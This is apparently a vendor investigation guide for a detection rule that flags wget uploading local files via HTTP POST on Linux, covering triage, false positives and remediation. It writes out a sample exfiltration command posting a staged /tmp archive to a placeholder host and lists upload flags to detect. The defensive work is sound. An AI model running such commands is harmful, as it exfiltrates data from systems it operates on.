---
applies_to:
  stack: ga all
  serverless:
    security: ga all
products:
  - id: security
  - id: cloud-serverless
description: Investigation guide for the "Potential Data Exfiltration Through Wget" prebuilt detection rule.
---

# Potential Data Exfiltration Through Wget

 ## Triage and analysis

> **Disclaimer**:
> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.

### Investigating Potential Data Exfiltration Through Wget

This rule flags Linux processes that launch wget with options that upload a local file via HTTP POST, a behavior used to exfiltrate staged data to an external server. Attackers gather files, compress them in /tmp, then execute wget --post-file=/tmp/loot.tar.gz https://example.com/upload from a non-interactive shell or cron job to covertly push the archive out over standard web traffic.

### Possible investigation steps

- Pull the full command line to extract the posted file path, verify the file still exists, capture size/timestamps, and hash its contents to gauge sensitivity and origin.
- Review the process tree and session context (parent, user, TTY, cron/systemd/container) and correlate with recent logins or scheduler entries to determine whether this was automated or a remote shell action.
- Enrich the destination endpoint with DNS, WHOIS, certificate, proxy, and egress firewall logs, and check for prior communications from this host to the same domain/IP to assess legitimacy.
- Pivot 30–60 minutes prior on the host/user for staging activity such as tar/gzip in /tmp, bulk file collection, or discovery commands, and interrogate shell history and filesystem events tied to the posted file.
- If the file was removed post-upload, attempt recovery from EDR or backups and estimate exfil volume and content types via proxy or egress gateway logs to determine impact and drive containment.

### False positive analysis

- A maintenance or monitoring script run via cron posts log archives or configuration snapshots using wget --post-file to an internal HTTP endpoint for routine diagnostics.
- An administrator or developer testing a web form or API uses wget --body-file to POST a sample file during troubleshooting, producing a benign one-off event.

### Response and remediation

- Immediately isolate the host, terminate the offending wget process, block outbound HTTP(S) to the destination domain/IP seen in the command wget --post-file=/path/to/file https://example.com/upload, and quarantine the posted file path and its parent directory.
- Identify and disable any cron, systemd, or shell script that invoked wget with --post-file or --body-file (e.g., entries in /etc/cron.d/, user crontabs, or /home/user/.local/bin/upload.sh), delete the script, and revoke the invoking account’s API tokens and SSH keys.
- Remove staged archives and temp files referenced in the upload (e.g., /tmp/loot.tar.gz and /var/tmp/*.gz), delete companion tooling or collection scripts found alongside them, and reimage the host if system integrity cannot be assured.
- If the posted content includes credentials, source code, or customer data, rotate affected passwords/keys, invalidate tokens, notify data owners, and restore impacted systems or files from known-good backups.
- Escalate to incident response and initiate wider containment if the destination domain/IP is not owned by the organization or resolves to an anonymizing/VPS service, if multiple hosts exhibit wget --post-file from non-interactive sessions, or if the uploader executed as root.
- Harden by enforcing SELinux/AppArmor policies that restrict wget/curl from posting files, requiring egress web proxy allowlists for HTTP POST destinations, adding detections for wget --post-file/--body-file and curl --upload-file/-F, and removing wget from systems where it is unnecessary.

